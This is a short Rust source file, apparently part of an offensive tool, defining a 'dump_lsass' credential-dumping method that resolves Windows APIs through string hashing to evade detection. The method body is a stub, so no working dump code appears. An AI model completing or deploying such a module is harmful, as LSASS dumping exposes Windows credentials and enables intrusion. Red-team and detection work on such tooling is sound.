#[cfg(target_os = "windows")]
use alloc::vec::Vec;

#[cfg(target_os = "windows")]
use core::ffi::c_void;
#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;

pub struct Credentials;

impl Credentials {
    pub fn dump_lsass(&self, output_path: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            // ...
            let _ = output_path;
            let kernel32 = hash_str(b"kernel32.dll");
            // ...
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        { 
            let _ = output_path;
            Err(()) 
        }
    }
}
